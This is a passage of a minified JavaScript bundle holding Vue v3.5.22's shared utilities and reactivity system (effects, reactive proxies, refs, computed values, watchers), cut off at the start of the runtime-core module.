/**
* @vue/shared v3.5.22
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
// @__NO_SIDE_EFFECTS__
function zo(e) {
  const t = /* @__PURE__ */ Object.create(null);
  for (const r of e.split(",")) t[r] = 1;
  return (r) => r in t;
}
const te = {}, Ft = [], Xe = () => {
}, en = () => !1, Wr = (e) => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && // uppercase letter
(e.charCodeAt(2) > 122 || e.charCodeAt(2) < 97), Ro = (e) => e.startsWith("onUpdate:"), ye = Object.assign, Lo = (e, t) => {
  const r = e.indexOf(t);
  r > -1 && e.splice(r, 1);
}, $a = Object.prototype.hasOwnProperty, Y = (e, t) => $a.call(e, t), M = Array.isArray, Dt = (e) => mr(e) === "[object Map]", Jr = (e) => mr(e) === "[object Set]", ss = (e) => mr(e) === "[object Date]", H = (e) => typeof e == "function", ce = (e) => typeof e == "string", Qe = (e) => typeof e == "symbol", se = (e) => e !== null && typeof e == "object", tn = (e) => (se(e) || H(e)) && H(e.then) && H(e.catch), rn = Object.prototype.toString, mr = (e) => rn.call(e), Pa = (e) => mr(e).slice(8, -1), on = (e) => mr(e) === "[object Object]", No = (e) => ce(e) && e !== "NaN" && e[0] !== "-" && "" + parseInt(e, 10) === e, Qt = /* @__PURE__ */ zo(
  // the leading comma is intentional so empty string "" is also included
  ",key,ref,ref_for,ref_key,onVnodeBeforeMount,onVnodeMounted,onVnodeBeforeUpdate,onVnodeUpdated,onVnodeBeforeUnmount,onVnodeUnmounted"
), Ur = (e) => {
  const t = /* @__PURE__ */ Object.create(null);
  return (r) => t[r] || (t[r] = e(r));
}, Oa = /-\w/g, mt = Ur(
  (e) => e.replace(Oa, (t) => t.slice(1).toUpperCase())
), Aa = /\B([A-Z])/g, At = Ur(
  (e) => e.replace(Aa, "-$1").toLowerCase()
), sn = Ur((e) => e.charAt(0).toUpperCase() + e.slice(1)), so = Ur(
  (e) => e ? `on${sn(e)}` : ""
), gt = (e, t) => !Object.is(e, t), Pr = (e, ...t) => {
  for (let r = 0; r < e.length; r++)
    e[r](...t);
}, nn = (e, t, r, o = !1) => {
  Object.defineProperty(e, t, {
    configurable: !0,
    enumerable: !1,
    writable: o,
    value: r
  });
}, vo = (e) => {
  const t = parseFloat(e);
  return isNaN(t) ? e : t;
};
let ns;
const Gr = () => ns || (ns = typeof globalThis < "u" ? globalThis : typeof self < "u" ? self : typeof window < "u" ? window : typeof global < "u" ? global : {});
function qr(e) {
  if (M(e)) {
    const t = {};
    for (let r = 0; r < e.length; r++) {
      const o = e[r], s = ce(o) ? Ra(o) : qr(o);
      if (s)
        for (const n in s)
          t[n] = s[n];
    }
    return t;
  } else if (ce(e) || se(e))
    return e;
}
const Ea = /;(?![^(]*\))/g, Ia = /:([^]+)/, za = /\/\*[^]*?\*\//g;
function Ra(e) {
  const t = {};
  return e.replace(za, "").split(Ea).forEach((r) => {
    if (r) {
      const o = r.split(Ia);
      o.length > 1 && (t[o[0].trim()] = o[1].trim());
    }
  }), t;
}
function De(e) {
  let t = "";
  if (ce(e))
    t = e;
  else if (M(e))
    for (let r = 0; r < e.length; r++) {
      const o = De(e[r]);
      o && (t += o + " ");
    }
  else if (se(e))
    for (const r in e)
      e[r] && (t += r + " ");
  return t.trim();
}
const La = "itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly", Na = /* @__PURE__ */ zo(La);
function an(e) {
  return !!e || e === "";
}
function Ma(e, t) {
  if (e.length !== t.length) return !1;
  let r = !0;
  for (let o = 0; r && o < e.length; o++)
    r = Yr(e[o], t[o]);
  return r;
}
function Yr(e, t) {
  if (e === t) return !0;
  let r = ss(e), o = ss(t);
  if (r || o)
    return r && o ? e.getTime() === t.getTime() : !1;
  if (r = Qe(e), o = Qe(t), r || o)
    return e === t;
  if (r = M(e), o = M(t), r || o)
    return r && o ? Ma(e, t) : !1;
  if (r = se(e), o = se(t), r || o) {
    if (!r || !o)
      return !1;
    const s = Object.keys(e).length, n = Object.keys(t).length;
    if (s !== n)
      return !1;
    for (const i in e) {
      const a = e.hasOwnProperty(i), l = t.hasOwnProperty(i);
      if (a && !l || !a && l || !Yr(e[i], t[i]))
        return !1;
    }
  }
  return String(e) === String(t);
}
function ln(e, t) {
  return e.findIndex((r) => Yr(r, t));
}
const cn = (e) => !!(e && e.__v_isRef === !0), E = (e) => ce(e) ? e : e == null ? "" : M(e) || se(e) && (e.toString === rn || !H(e.toString)) ? cn(e) ? E(e.value) : JSON.stringify(e, un, 2) : String(e), un = (e, t) => cn(t) ? un(e, t.value) : Dt(t) ? {
  [`Map(${t.size})`]: [...t.entries()].reduce(
    (r, [o, s], n) => (r[no(o, n) + " =>"] = s, r),
    {}
  )
} : Jr(t) ? {
  [`Set(${t.size})`]: [...t.values()].map((r) => no(r))
} : Qe(t) ? no(t) : se(t) && !M(t) && !on(t) ? String(t) : t, no = (e, t = "") => {
  var r;
  return (
    // Symbol.description in es2019+ so we need to cast here to pass
    // the lib: es2016 check
    Qe(e) ? `Symbol(${(r = e.description) != null ? r : t})` : e
  );
};
/**
* @vue/reactivity v3.5.22
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
let me;
class dn {
  constructor(t = !1) {
    this.detached = t, this._active = !0, this._on = 0, this.effects = [], this.cleanups = [], this._isPaused = !1, this.parent = me, !t && me && (this.index = (me.scopes || (me.scopes = [])).push(
      this
    ) - 1);
  }
  get active() {
    return this._active;
  }
  pause() {
    if (this._active) {
      this._isPaused = !0;
      let t, r;
      if (this.scopes)
        for (t = 0, r = this.scopes.length; t < r; t++)
          this.scopes[t].pause();
      for (t = 0, r = this.effects.length; t < r; t++)
        this.effects[t].pause();
    }
  }
  /**
   * Resumes the effect scope, including all child scopes and effects.
   */
  resume() {
    if (this._active && this._isPaused) {
      this._isPaused = !1;
      let t, r;
      if (this.scopes)
        for (t = 0, r = this.scopes.length; t < r; t++)
          this.scopes[t].resume();
      for (t = 0, r = this.effects.length; t < r; t++)
        this.effects[t].resume();
    }
  }
  run(t) {
    if (this._active) {
      const r = me;
      try {
        return me = this, t();
      } finally {
        me = r;
      }
    }
  }
  /**
   * This should only be called on non-detached scopes
   * @internal
   */
  on() {
    ++this._on === 1 && (this.prevScope = me, me = this);
  }
  /**
   * This should only be called on non-detached scopes
   * @internal
   */
  off() {
    this._on > 0 && --this._on === 0 && (me = this.prevScope, this.prevScope = void 0);
  }
  stop(t) {
    if (this._active) {
      this._active = !1;
      let r, o;
      for (r = 0, o = this.effects.length; r < o; r++)
        this.effects[r].stop();
      for (this.effects.length = 0, r = 0, o = this.cleanups.length; r < o; r++)
        this.cleanups[r]();
      if (this.cleanups.length = 0, this.scopes) {
        for (r = 0, o = this.scopes.length; r < o; r++)
          this.scopes[r].stop(!0);
        this.scopes.length = 0;
      }
      if (!this.detached && this.parent && !t) {
        const s = this.parent.scopes.pop();
        s && s !== this && (this.parent.scopes[this.index] = s, s.index = this.index);
      }
      this.parent = void 0;
    }
  }
}
function fn(e) {
  return new dn(e);
}
function pn() {
  return me;
}
function Fa(e, t = !1) {
  me && me.cleanups.push(e);
}
let oe;
const ao = /* @__PURE__ */ new WeakSet();
class bn {
  constructor(t) {
    this.fn = t, this.deps = void 0, this.depsTail = void 0, this.flags = 5, this.next = void 0, this.cleanup = void 0, this.scheduler = void 0, me && me.active && me.effects.push(this);
  }
  pause() {
    this.flags |= 64;
  }
  resume() {
    this.flags & 64 && (this.flags &= -65, ao.has(this) && (ao.delete(this), this.trigger()));
  }
  /**
   * @internal
   */
  notify() {
    this.flags & 2 && !(this.flags & 32) || this.flags & 8 || hn(this);
  }
  run() {
    if (!(this.flags & 1))
      return this.fn();
    this.flags |= 2, as(this), mn(this);
    const t = oe, r = Be;
    oe = this, Be = !0;
    try {
      return this.fn();
    } finally {
      xn(this), oe = t, Be = r, this.flags &= -3;
    }
  }
  stop() {
    if (this.flags & 1) {
      for (let t = this.deps; t; t = t.nextDep)
        Do(t);
      this.deps = this.depsTail = void 0, as(this), this.onStop && this.onStop(), this.flags &= -2;
    }
  }
  trigger() {
    this.flags & 64 ? ao.add(this) : this.scheduler ? this.scheduler() : this.runIfDirty();
  }
  /**
   * @internal
   */
  runIfDirty() {
    yo(this) && this.run();
  }
  get dirty() {
    return yo(this);
  }
}
let gn = 0, Zt, er;
function hn(e, t = !1) {
  if (e.flags |= 8, t) {
    e.next = er, er = e;
    return;
  }
  e.next = Zt, Zt = e;
}
function Mo() {
  gn++;
}
function Fo() {
  if (--gn > 0)
    return;
  if (er) {
    let t = er;
    for (er = void 0; t; ) {
      const r = t.next;
      t.next = void 0, t.flags &= -9, t = r;
    }
  }
  let e;
  for (; Zt; ) {
    let t = Zt;
    for (Zt = void 0; t; ) {
      const r = t.next;
      if (t.next = void 0, t.flags &= -9, t.flags & 1)
        try {
          t.trigger();
        } catch (o) {
          e || (e = o);
        }
      t = r;
    }
  }
  if (e) throw e;
}
function mn(e) {
  for (let t = e.deps; t; t = t.nextDep)
    t.version = -1, t.prevActiveLink = t.dep.activeLink, t.dep.activeLink = t;
}
function xn(e) {
  let t, r = e.depsTail, o = r;
  for (; o; ) {
    const s = o.prevDep;
    o.version === -1 ? (o === r && (r = s), Do(o), Da(o)) : t = o, o.dep.activeLink = o.prevActiveLink, o.prevActiveLink = void 0, o = s;
  }
  e.deps = t, e.depsTail = r;
}
function yo(e) {
  for (let t = e.deps; t; t = t.nextDep)
    if (t.dep.version !== t.version || t.dep.computed && (vn(t.dep.computed) || t.dep.version !== t.version))
      return !0;
  return !!e._dirty;
}
function vn(e) {
  if (e.flags & 4 && !(e.flags & 16) || (e.flags &= -17, e.globalVersion === cr) || (e.globalVersion = cr, !e.isSSR && e.flags & 128 && (!e.deps && !e._dirty || !yo(e))))
    return;
  e.flags |= 2;
  const t = e.dep, r = oe, o = Be;
  oe = e, Be = !0;
  try {
    mn(e);
    const s = e.fn(e._value);
    (t.version === 0 || gt(s, e._value)) && (e.flags |= 128, e._value = s, t.version++);
  } catch (s) {
    throw t.version++, s;
  } finally {
    oe = r, Be = o, xn(e), e.flags &= -3;
  }
}
function Do(e, t = !1) {
  const { dep: r, prevSub: o, nextSub: s } = e;
  if (o && (o.nextSub = s, e.prevSub = void 0), s && (s.prevSub = o, e.nextSub = void 0), r.subs === e && (r.subs = o, !o && r.computed)) {
    r.computed.flags &= -5;
    for (let n = r.computed.deps; n; n = n.nextDep)
      Do(n, !0);
  }
  !t && !--r.sc && r.map && r.map.delete(r.key);
}
function Da(e) {
  const { prevDep: t, nextDep: r } = e;
  t && (t.nextDep = r, e.prevDep = void 0), r && (r.prevDep = t, e.nextDep = void 0);
}
let Be = !0;
const yn = [];
function it() {
  yn.push(Be), Be = !1;
}
function lt() {
  const e = yn.pop();
  Be = e === void 0 ? !0 : e;
}
function as(e) {
  const { cleanup: t } = e;
  if (e.cleanup = void 0, t) {
    const r = oe;
    oe = void 0;
    try {
      t();
    } finally {
      oe = r;
    }
  }
}
let cr = 0;
class Va {
  constructor(t, r) {
    this.sub = t, this.dep = r, this.version = r.version, this.nextDep = this.prevDep = this.nextSub = this.prevSub = this.prevActiveLink = void 0;
  }
}
class Vo {
  // TODO isolatedDeclarations "__v_skip"
  constructor(t) {
    this.computed = t, this.version = 0, this.activeLink = void 0, this.subs = void 0, this.map = void 0, this.key = void 0, this.sc = 0, this.__v_skip = !0;
  }
  track(t) {
    if (!oe || !Be || oe === this.computed)
      return;
    let r = this.activeLink;
    if (r === void 0 || r.sub !== oe)
      r = this.activeLink = new Va(oe, this), oe.deps ? (r.prevDep = oe.depsTail, oe.depsTail.nextDep = r, oe.depsTail = r) : oe.deps = oe.depsTail = r, kn(r);
    else if (r.version === -1 && (r.version = this.version, r.nextDep)) {
      const o = r.nextDep;
      o.prevDep = r.prevDep, r.prevDep && (r.prevDep.nextDep = o), r.prevDep = oe.depsTail, r.nextDep = void 0, oe.depsTail.nextDep = r, oe.depsTail = r, oe.deps === r && (oe.deps = o);
    }
    return r;
  }
  trigger(t) {
    this.version++, cr++, this.notify(t);
  }
  notify(t) {
    Mo();
    try {
      for (let r = this.subs; r; r = r.prevSub)
        r.sub.notify() && r.sub.dep.notify();
    } finally {
      Fo();
    }
  }
}
function kn(e) {
  if (e.dep.sc++, e.sub.flags & 4) {
    const t = e.dep.computed;
    if (t && !e.dep.subs) {
      t.flags |= 20;
      for (let o = t.deps; o; o = o.nextDep)
        kn(o);
    }
    const r = e.dep.subs;
    r !== e && (e.prevSub = r, r && (r.nextSub = e)), e.dep.subs = e;
  }
}
const Er = /* @__PURE__ */ new WeakMap(), $t = Symbol(
  ""
), ko = Symbol(
  ""
), ur = Symbol(
  ""
);
function ve(e, t, r) {
  if (Be && oe) {
    let o = Er.get(e);
    o || Er.set(e, o = /* @__PURE__ */ new Map());
    let s = o.get(r);
    s || (o.set(r, s = new Vo()), s.map = o, s.key = r), s.track();
  }
}
function st(e, t, r, o, s, n) {
  const i = Er.get(e);
  if (!i) {
    cr++;
    return;
  }
  const a = (l) => {
    l && l.trigger();
  };
  if (Mo(), t === "clear")
    i.forEach(a);
  else {
    const l = M(e), u = l && No(r);
    if (l && r === "length") {
      const c = Number(o);
      i.forEach((p, m) => {
        (m === "length" || m === ur || !Qe(m) && m >= c) && a(p);
      });
    } else
      switch ((r !== void 0 || i.has(void 0)) && a(i.get(r)), u && a(i.get(ur)), t) {
        case "add":
          l ? u && a(i.get("length")) : (a(i.get($t)), Dt(e) && a(i.get(ko)));
          break;
        case "delete":
          l || (a(i.get($t)), Dt(e) && a(i.get(ko)));
          break;
        case "set":
          Dt(e) && a(i.get($t));
          break;
      }
  }
  Fo();
}
function Ba(e, t) {
  const r = Er.get(e);
  return r && r.get(t);
}
function It(e) {
  const t = G(e);
  return t === e ? t : (ve(t, "iterate", ur), Le(e) ? t : t.map(be));
}
function Xr(e) {
  return ve(e = G(e), "iterate", ur), e;
}
const Ka = {
  __proto__: null,
  [Symbol.iterator]() {
    return io(this, Symbol.iterator, be);
  },
  concat(...e) {
    return It(this).concat(
      ...e.map((t) => M(t) ? It(t) : t)
    );
  },
  entries() {
    return io(this, "entries", (e) => (e[1] = be(e[1]), e));
  },
  every(e, t) {
    return et(this, "every", e, t, void 0, arguments);
  },
  filter(e, t) {
    return et(this, "filter", e, t, (r) => r.map(be), arguments);
  },
  find(e, t) {
    return et(this, "find", e, t, be, arguments);
  },
  findIndex(e, t) {
    return et(this, "findIndex", e, t, void 0, arguments);
  },
  findLast(e, t) {
    return et(this, "findLast", e, t, be, arguments);
  },
  findLastIndex(e, t) {
    return et(this, "findLastIndex", e, t, void 0, arguments);
  },
  // flat, flatMap could benefit from ARRAY_ITERATE but are not straight-forward to implement
  forEach(e, t) {
    return et(this, "forEach", e, t, void 0, arguments);
  },
  includes(...e) {
    return lo(this, "includes", e);
  },
  indexOf(...e) {
    return lo(this, "indexOf", e);
  },
  join(e) {
    return It(this).join(e);
  },
  // keys() iterator only reads `length`, no optimization required
  lastIndexOf(...e) {
    return lo(this, "lastIndexOf", e);
  },
  map(e, t) {
    return et(this, "map", e, t, void 0, arguments);
  },
  pop() {
    return Gt(this, "pop");
  },
  push(...e) {
    return Gt(this, "push", e);
  },
  reduce(e, ...t) {
    return is(this, "reduce", e, t);
  },
  reduceRight(e, ...t) {
    return is(this, "reduceRight", e, t);
  },
  shift() {
    return Gt(this, "shift");
  },
  // slice could use ARRAY_ITERATE but also seems to beg for range tracking
  some(e, t) {
    return et(this, "some", e, t, void 0, arguments);
  },
  splice(...e) {
    return Gt(this, "splice", e);
  },
  toReversed() {
    return It(this).toReversed();
  },
  toSorted(e) {
    return It(this).toSorted(e);
  },
  toSpliced(...e) {
    return It(this).toSpliced(...e);
  },
  unshift(...e) {
    return Gt(this, "unshift", e);
  },
  values() {
    return io(this, "values", be);
  }
};
function io(e, t, r) {
  const o = Xr(e), s = o[t]();
  return o !== e && !Le(e) && (s._next = s.next, s.next = () => {
    const n = s._next();
    return n.done || (n.value = r(n.value)), n;
  }), s;
}
const Ha = Array.prototype;
function et(e, t, r, o, s, n) {
  const i = Xr(e), a = i !== e && !Le(e), l = i[t];
  if (l !== Ha[t]) {
    const p = l.apply(e, n);
    return a ? be(p) : p;
  }
  let u = r;
  i !== e && (a ? u = function(p, m) {
    return r.call(this, be(p), m, e);
  } : r.length > 2 && (u = function(p, m) {
    return r.call(this, p, m, e);
  }));
  const c = l.call(i, u, o);
  return a && s ? s(c) : c;
}
function is(e, t, r, o) {
  const s = Xr(e);
  let n = r;
  return s !== e && (Le(e) ? r.length > 3 && (n = function(i, a, l) {
    return r.call(this, i, a, l, e);
  }) : n = function(i, a, l) {
    return r.call(this, i, be(a), l, e);
  }), s[t](n, ...o);
}
function lo(e, t, r) {
  const o = G(e);
  ve(o, "iterate", ur);
  const s = o[t](...r);
  return (s === -1 || s === !1) && Ho(r[0]) ? (r[0] = G(r[0]), o[t](...r)) : s;
}
function Gt(e, t, r = []) {
  it(), Mo();
  const o = G(e)[t].apply(e, r);
  return Fo(), lt(), o;
}
const Wa = /* @__PURE__ */ zo("__proto__,__v_isRef,__isVue"), wn = new Set(
  /* @__PURE__ */ Object.getOwnPropertyNames(Symbol).filter((e) => e !== "arguments" && e !== "caller").map((e) => Symbol[e]).filter(Qe)
);
function Ja(e) {
  Qe(e) || (e = String(e));
  const t = G(this);
  return ve(t, "has", e), t.hasOwnProperty(e);
}
class _n {
  constructor(t = !1, r = !1) {
    this._isReadonly = t, this._isShallow = r;
  }
  get(t, r, o) {
    if (r === "__v_skip") return t.__v_skip;
    const s = this._isReadonly, n = this._isShallow;
    if (r === "__v_isReactive")
      return !s;
    if (r === "__v_isReadonly")
      return s;
    if (r === "__v_isShallow")
      return n;
    if (r === "__v_raw")
      return o === (s ? n ? ri : Tn : n ? jn : Cn).get(t) || // receiver is not the reactive proxy, but has the same prototype
      // this means the receiver is a user proxy of the reactive proxy
      Object.getPrototypeOf(t) === Object.getPrototypeOf(o) ? t : void 0;
    const i = M(t);
    if (!s) {
      let l;
      if (i && (l = Ka[r]))
        return l;
      if (r === "hasOwnProperty")
        return Ja;
    }
    const a = Reflect.get(
      t,
      r,
      // if this is a proxy wrapping a ref, return methods using the raw ref
      // as receiver so that we don't have to call `toRaw` on the ref in all
      // its class methods
      le(t) ? t : o
    );
    if ((Qe(r) ? wn.has(r) : Wa(r)) || (s || ve(t, "get", r), n))
      return a;
    if (le(a)) {
      const l = i && No(r) ? a : a.value;
      return s && se(l) ? Ir(l) : l;
    }
    return se(a) ? s ? Ir(a) : Wt(a) : a;
  }
}
class Sn extends _n {
  constructor(t = !1) {
    super(!1, t);
  }
  set(t, r, o, s) {
    let n = t[r];
    if (!this._isShallow) {
      const l = xt(n);
      if (!Le(o) && !xt(o) && (n = G(n), o = G(o)), !M(t) && le(n) && !le(o))
        return l || (n.value = o), !0;
    }
    const i = M(t) && No(r) ? Number(r) < t.length : Y(t, r), a = Reflect.set(
      t,
      r,
      o,
      le(t) ? t : s
    );
    return t === G(s) && (i ? gt(o, n) && st(t, "set", r, o) : st(t, "add", r, o)), a;
  }
  deleteProperty(t, r) {
    const o = Y(t, r);
    t[r];
    const s = Reflect.deleteProperty(t, r);
    return s && o && st(t, "delete", r, void 0), s;
  }
  has(t, r) {
    const o = Reflect.has(t, r);
    return (!Qe(r) || !wn.has(r)) && ve(t, "has", r), o;
  }
  ownKeys(t) {
    return ve(
      t,
      "iterate",
      M(t) ? "length" : $t
    ), Reflect.ownKeys(t);
  }
}
class Ua extends _n {
  constructor(t = !1) {
    super(!0, t);
  }
  set(t, r) {
    return !0;
  }
  deleteProperty(t, r) {
    return !0;
  }
}
const Ga = /* @__PURE__ */ new Sn(), qa = /* @__PURE__ */ new Ua(), Ya = /* @__PURE__ */ new Sn(!0);
const wo = (e) => e, _r = (e) => Reflect.getPrototypeOf(e);
function Xa(e, t, r) {
  return function(...o) {
    const s = this.__v_raw, n = G(s), i = Dt(n), a = e === "entries" || e === Symbol.iterator && i, l = e === "keys" && i, u = s[e](...o), c = r ? wo : t ? zr : be;
    return !t && ve(
      n,
      "iterate",
      l ? ko : $t
    ), {
      // iterator protocol
      next() {
        const { value: p, done: m } = u.next();
        return m ? { value: p, done: m } : {
          value: a ? [c(p[0]), c(p[1])] : c(p),
          done: m
        };
      },
      // iterable protocol
      [Symbol.iterator]() {
        return this;
      }
    };
  };
}
function Sr(e) {
  return function(...t) {
    return e === "delete" ? !1 : e === "clear" ? void 0 : this;
  };
}
function Qa(e, t) {
  const r = {
    get(s) {
      const n = this.__v_raw, i = G(n), a = G(s);
      e || (gt(s, a) && ve(i, "get", s), ve(i, "get", a));
      const { has: l } = _r(i), u = t ? wo : e ? zr : be;
      if (l.call(i, s))
        return u(n.get(s));
      if (l.call(i, a))
        return u(n.get(a));
      n !== i && n.get(s);
    },
    get size() {
      const s = this.__v_raw;
      return !e && ve(G(s), "iterate", $t), s.size;
    },
    has(s) {
      const n = this.__v_raw, i = G(n), a = G(s);
      return e || (gt(s, a) && ve(i, "has", s), ve(i, "has", a)), s === a ? n.has(s) : n.has(s) || n.has(a);
    },
    forEach(s, n) {
      const i = this, a = i.__v_raw, l = G(a), u = t ? wo : e ? zr : be;
      return !e && ve(l, "iterate", $t), a.forEach((c, p) => s.call(n, u(c), u(p), i));
    }
  };
  return ye(
    r,
    e ? {
      add: Sr("add"),
      set: Sr("set"),
      delete: Sr("delete"),
      clear: Sr("clear")
    } : {
      add(s) {
        !t && !Le(s) && !xt(s) && (s = G(s));
        const n = G(this);
        return _r(n).has.call(n, s) || (n.add(s), st(n, "add", s, s)), this;
      },
      set(s, n) {
        !t && !Le(n) && !xt(n) && (n = G(n));
        const i = G(this), { has: a, get: l } = _r(i);
        let u = a.call(i, s);
        u || (s = G(s), u = a.call(i, s));
        const c = l.call(i, s);
        return i.set(s, n), u ? gt(n, c) && st(i, "set", s, n) : st(i, "add", s, n), this;
      },
      delete(s) {
        const n = G(this), { has: i, get: a } = _r(n);
        let l = i.call(n, s);
        l || (s = G(s), l = i.call(n, s)), a && a.call(n, s);
        const u = n.delete(s);
        return l && st(n, "delete", s, void 0), u;
      },
      clear() {
        const s = G(this), n = s.size !== 0, i = s.clear();
        return n && st(
          s,
          "clear",
          void 0,
          void 0
        ), i;
      }
    }
  ), [
    "keys",
    "values",
    "entries",
    Symbol.iterator
  ].forEach((s) => {
    r[s] = Xa(s, e, t);
  }), r;
}
function Bo(e, t) {
  const r = Qa(e, t);
  return (o, s, n) => s === "__v_isReactive" ? !e : s === "__v_isReadonly" ? e : s === "__v_raw" ? o : Reflect.get(
    Y(r, s) && s in o ? r : o,
    s,
    n
  );
}
const Za = {
  get: /* @__PURE__ */ Bo(!1, !1)
}, ei = {
  get: /* @__PURE__ */ Bo(!1, !0)
}, ti = {
  get: /* @__PURE__ */ Bo(!0, !1)
};
const Cn = /* @__PURE__ */ new WeakMap(), jn = /* @__PURE__ */ new WeakMap(), Tn = /* @__PURE__ */ new WeakMap(), ri = /* @__PURE__ */ new WeakMap();
function oi(e) {
  switch (e) {
    case "Object":
    case "Array":
      return 1;
    case "Map":
    case "Set":
    case "WeakMap":
    case "WeakSet":
      return 2;
    default:
      return 0;
  }
}
function si(e) {
  return e.__v_skip || !Object.isExtensible(e) ? 0 : oi(Pa(e));
}
function Wt(e) {
  return xt(e) ? e : Ko(
    e,
    !1,
    Ga,
    Za,
    Cn
  );
}
function ni(e) {
  return Ko(
    e,
    !1,
    Ya,
    ei,
    jn
  );
}
function Ir(e) {
  return Ko(
    e,
    !0,
    qa,
    ti,
    Tn
  );
}
function Ko(e, t, r, o, s) {
  if (!se(e) || e.__v_raw && !(t && e.__v_isReactive))
    return e;
  const n = si(e);
  if (n === 0)
    return e;
  const i = s.get(e);
  if (i)
    return i;
  const a = new Proxy(
    e,
    n === 2 ? o : r
  );
  return s.set(e, a), a;
}
function ht(e) {
  return xt(e) ? ht(e.__v_raw) : !!(e && e.__v_isReactive);
}
function xt(e) {
  return !!(e && e.__v_isReadonly);
}
function Le(e) {
  return !!(e && e.__v_isShallow);
}
function Ho(e) {
  return e ? !!e.__v_raw : !1;
}
function G(e) {
  const t = e && e.__v_raw;
  return t ? G(t) : e;
}
function Wo(e) {
  return !Y(e, "__v_skip") && Object.isExtensible(e) && nn(e, "__v_skip", !0), e;
}
const be = (e) => se(e) ? Wt(e) : e, zr = (e) => se(e) ? Ir(e) : e;
function le(e) {
  return e ? e.__v_isRef === !0 : !1;
}
function ue(e) {
  return ai(e, !1);
}
function ai(e, t) {
  return le(e) ? e : new ii(e, t);
}
class ii {
  constructor(t, r) {
    this.dep = new Vo(), this.__v_isRef = !0, this.__v_isShallow = !1, this._rawValue = r ? t : G(t), this._value = r ? t : be(t), this.__v_isShallow = r;
  }
  get value() {
    return this.dep.track(), this._value;
  }
  set value(t) {
    const r = this._rawValue, o = this.__v_isShallow || Le(t) || xt(t);
    t = o ? t : G(t), gt(t, r) && (this._rawValue = t, this._value = o ? t : be(t), this.dep.trigger());
  }
}
function Ae(e) {
  return le(e) ? e.value : e;
}
const li = {
  get: (e, t, r) => t === "__v_raw" ? e : Ae(Reflect.get(e, t, r)),
  set: (e, t, r, o) => {
    const s = e[t];
    return le(s) && !le(r) ? (s.value = r, !0) : Reflect.set(e, t, r, o);
  }
};
function $n(e) {
  return ht(e) ? e : new Proxy(e, li);
}
function ci(e) {
  const t = M(e) ? new Array(e.length) : {};
  for (const r in e)
    t[r] = di(e, r);
  return t;
}
class ui {
  constructor(t, r, o) {
    this._object = t, this._key = r, this._defaultValue = o, this.__v_isRef = !0, this._value = void 0;
  }
  get value() {
    const t = this._object[this._key];
    return this._value = t === void 0 ? this._defaultValue : t;
  }
  set value(t) {
    this._object[this._key] = t;
  }
  get dep() {
    return Ba(G(this._object), this._key);
  }
}
function di(e, t, r) {
  const o = e[t];
  return le(o) ? o : new ui(e, t, r);
}
class fi {
  constructor(t, r, o) {
    this.fn = t, this.setter = r, this._value = void 0, this.dep = new Vo(this), this.__v_isRef = !0, this.deps = void 0, this.depsTail = void 0, this.flags = 16, this.globalVersion = cr - 1, this.next = void 0, this.effect = this, this.__v_isReadonly = !r, this.isSSR = o;
  }
  /**
   * @internal
   */
  notify() {
    if (this.flags |= 16, !(this.flags & 8) && // avoid infinite self recursion
    oe !== this)
      return hn(this, !0), !0;
  }
  get value() {
    const t = this.dep.track();
    return vn(this), t && (t.version = this.dep.version), this._value;
  }
  set value(t) {
    this.setter && this.setter(t);
  }
}
function pi(e, t, r = !1) {
  let o, s;
  return H(e) ? o = e : (o = e.get, s = e.set), new fi(o, s, r);
}
const Cr = {}, Rr = /* @__PURE__ */ new WeakMap();
let St;
function bi(e, t = !1, r = St) {
  if (r) {
    let o = Rr.get(r);
    o || Rr.set(r, o = []), o.push(e);
  }
}
function gi(e, t, r = te) {
  const { immediate: o, deep: s, once: n, scheduler: i, augmentJob: a, call: l } = r, u = (O) => s ? O : Le(O) || s === !1 || s === 0 ? nt(O, 1) : nt(O);
  let c, p, m, g, h = !1, b = !1;
  if (le(e) ? (p = () => e.value, h = Le(e)) : ht(e) ? (p = () => u(e), h = !0) : M(e) ? (b = !0, h = e.some((O) => ht(O) || Le(O)), p = () => e.map((O) => {
    if (le(O))
      return O.value;
    if (ht(O))
      return u(O);
    if (H(O))
      return l ? l(O, 2) : O();
  })) : H(e) ? t ? p = l ? () => l(e, 2) : e : p = () => {
    if (m) {
      it();
      try {
        m();
      } finally {
        lt();
      }
    }
    const O = St;
    St = c;
    try {
      return l ? l(e, 3, [g]) : e(g);
    } finally {
      St = O;
    }
  } : p = Xe, t && s) {
    const O = p, B = s === !0 ? 1 / 0 : s;
    p = () => nt(O(), B);
  }
  const C = pn(), I = () => {
    c.stop(), C && C.active && Lo(C.effects, c);
  };
  if (n && t) {
    const O = t;
    t = (...B) => {
      O(...B), I();
    };
  }
  let R = b ? new Array(e.length).fill(Cr) : Cr;
  const F = (O) => {
    if (!(!(c.flags & 1) || !c.dirty && !O))
      if (t) {
        const B = c.run();
        if (s || h || (b ? B.some((q, ee) => gt(q, R[ee])) : gt(B, R))) {
          m && m();
          const q = St;
          St = c;
          try {
            const ee = [
              B,
              // pass undefined as the old value when it's changed for the first time
              R === Cr ? void 0 : b && R[0] === Cr ? [] : R,
              g
            ];
            R = B, l ? l(t, 3, ee) : (
              // @ts-expect-error
              t(...ee)
            );
          } finally {
            St = q;
          }
        }
      } else
        c.run();
  };
  return a && a(F), c = new bn(p), c.scheduler = i ? () => i(F, !1) : F, g = (O) => bi(O, !1, c), m = c.onStop = () => {
    const O = Rr.get(c);
    if (O) {
      if (l)
        l(O, 4);
      else
        for (const B of O) B();
      Rr.delete(c);
    }
  }, t ? o ? F(!0) : R = c.run() : i ? i(F.bind(null, !0), !0) : c.run(), I.pause = c.pause.bind(c), I.resume = c.resume.bind(c), I.stop = I, I;
}
function nt(e, t = 1 / 0, r) {
  if (t <= 0 || !se(e) || e.__v_skip || (r = r || /* @__PURE__ */ new Map(), (r.get(e) || 0) >= t))
    return e;
  if (r.set(e, t), t--, le(e))
    nt(e.value, t, r);
  else if (M(e))
    for (let o = 0; o < e.length; o++)
      nt(e[o], t, r);
  else if (Jr(e) || Dt(e))
    e.forEach((o) => {
      nt(o, t, r);
    });
  else if (on(e)) {
    for (const o in e)
      nt(e[o], t, r);
    for (const o of Object.getOwnPropertySymbols(e))
      Object.prototype.propertyIsEnumerable.call(e, o) && nt(e[o], t, r);
  }
  return e;
}
/**
* @vue/runtime-core v3.5.22
* (c) 2018-present Yuxi (Evan) You and Vue contributors
* @license MIT
**/
function xr(e, t, r, o) {
  try {
    return o ? e(...o) : e();
